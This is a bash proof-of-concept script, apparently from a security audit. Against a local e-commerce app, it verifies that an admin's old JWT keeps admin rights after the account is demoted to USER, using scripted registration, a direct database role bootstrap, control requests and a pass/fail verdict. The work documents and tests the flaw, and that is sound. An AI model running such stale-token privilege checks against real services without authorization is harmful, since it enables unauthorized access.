#!/usr/bin/env bash
set -u
B=http://localhost:3000
PW='Passw0rd1'

reg() { curl -s -o /dev/null -w '%{http_code}' -X POST "$B/user" -H 'Content-Type: application/json' -d "{\"email\":\"$1\",\"password\":\"$PW\"}"; }
acc() { python3 -c "import sys,json;print(json.load(sys.stdin).get('accessToken',''))" 2>/dev/null; }
login() { curl -s -X POST "$B/login" -H 'Content-Type: application/json' -d "{\"email\":\"$1\",\"password\":\"$2\"}" | acc; }
claim() { echo "$1" | cut -d. -f2 | python3 -c "import sys,base64,json;s=sys.stdin.read().strip();s+='='*(-len(s)%4);d=json.loads(base64.urlsafe_b64decode(s));print('userRole=%s sub=%s'%(d.get('userRole'),d.get('sub')))"; }
C() { curl -s -o /tmp/av -w '%{http_code}' -X "$1" "$B$2" -H "Authorization: Bearer $3" -H 'Content-Type: application/json' -d "$4"; }
body() { head -c 90 /tmp/av | tr '\n' ' '; }

echo "== register admin/victim/plain =="
echo "  admin=$(reg admin@test.com) victim=$(reg victim@test.com) plain=$(reg plain@test.com)"
echo "== DB-bootstrap first admins (no REST path to create admin) =="
docker exec alvaro-pg psql -U alvaro -d ecommerce -c "UPDATE \"User\" SET role='ADMIN' WHERE email IN ('admin@test.com','victim@test.com');" 2>&1 | tr '\n' ' '; echo
echo "== logins =="
TA=$(login admin@test.com "$PW"); echo "  admin: $(claim "$TA")"
TV=$(login victim@test.com "$PW"); echo "  victim(old): $(claim "$TV")"
TP=$(login plain@test.com "$PW"); echo "  plain: $(claim "$TP")"

echo "== admin creates category cat1 (source target) =="
echo "  create: $(C POST /category "$TA" '{"name":"cat1"}') $(body)"
CID=$(curl -s -G "$B/category/cat1" -H "Authorization: Bearer $TA" | python3 -c "import sys,json;d=json.load(sys.stdin);print((d.get('id') or (d.get('category') or {}).get('id') or ''))" 2>/dev/null)
echo "  cat1 id=$CID"

echo "== NEG CONTROL: plain PATCH /category/{id} -> expect 403 =="
C_NEG=$(C PATCH /category/$CID "$TP" '{"name":"cat1"}'); echo "  neg=$C_NEG $(body)"
echo "== A/B victim_old (ADMIN) PATCH category (SOURCE before) -> expect 2xx =="
C_BEFORE=$(C PATCH /category/$CID "$TV" '{"name":"cat1"}'); echo "  before=$C_BEFORE $(body)"
echo "== D TRANSITION admin demotes victim -> USER -> expect 2xx =="
C_TRANS=$(C PATCH /user/role "$TA" '{"email":"victim@test.com","role":"USER"}'); echo "  transition=$C_TRANS $(body)"
echo "== E BUG victim_old SAME token PATCH category (after demotion) -> expect 2xx =="
C_AFTER=$(C PATCH /category/$CID "$TV" '{"name":"cat1"}'); echo "  after=$C_AFTER $(body)"
echo "== F D1 victim re-login new token -> PATCH category -> expect 403 =="
TVN=$(login victim@test.com "$PW"); echo "  new: $(claim "$TVN")"
C_NEW=$(C PATCH /category/$CID "$TVN" '{"name":"cat1"}'); echo "  newtok=$C_NEW $(body)"

echo "== VERDICT =="
ok=1
case "$C_BEFORE" in 2*) ;; *) echo "  X source before not 2xx ($C_BEFORE)"; ok=0;; esac
case "$C_TRANS" in 2*) ;; *) echo "  X transition not 2xx ($C_TRANS)"; ok=0;; esac
case "$C_AFTER" in 2*) ;; *) echo "  X old-token after not 2xx ($C_AFTER)"; ok=0;; esac
[ "$C_NEW" = 403 ] || { echo "  X new-token != 403 ($C_NEW)"; ok=0; }
[ "$C_NEG" = 403 ] || { echo "  X neg != 403 ($C_NEG)"; ok=0; }
if [ "$ok" = 1 ]; then
  echo "  PASS: MR-A1 confirmed on running alvaro $(git -C infra/alvaro-target/app rev-parse --short HEAD 2>/dev/null)"
  echo "  old-token(ADMIN) after demotion=$C_AFTER vs new-token(USER)=$C_NEW ; neg=$C_NEG"
  exit 0
else echo "  FAIL"; exit 1; fi
